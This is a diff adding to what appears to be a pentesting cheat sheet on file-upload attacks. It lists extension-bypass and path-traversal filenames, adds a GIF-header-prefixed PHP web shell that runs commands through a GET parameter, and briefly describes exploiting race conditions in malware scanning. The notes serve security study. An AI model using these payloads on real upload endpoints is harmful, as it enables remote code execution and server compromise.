@@ -36,4 +36,16 @@ Content-Disposition: form-data; name="image"; filename="../../example.php"
  - exploit.asp;.jpg
  - exploit.asp%00.jpg
  - exploit.p.phphp
- - For detailed explaination https://portswigger.net/web-security/file-upload 
+ - For detailed explaination https://portswigger.net/web-security/file-upload
+
+##### Flawed validation of the file's contents
+ - Some check file contents as well.
+ - Change header
+```
+GIF87a
+<?php echo system($_GET['cmd']); ?>
+```
+ - For more https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/ .
+
+###### Exploiting file upload race conditions
+ - Some might rely on antimalware to remove it, for short period of time, the file might be present, during that time u might be able to access or execute php code even.
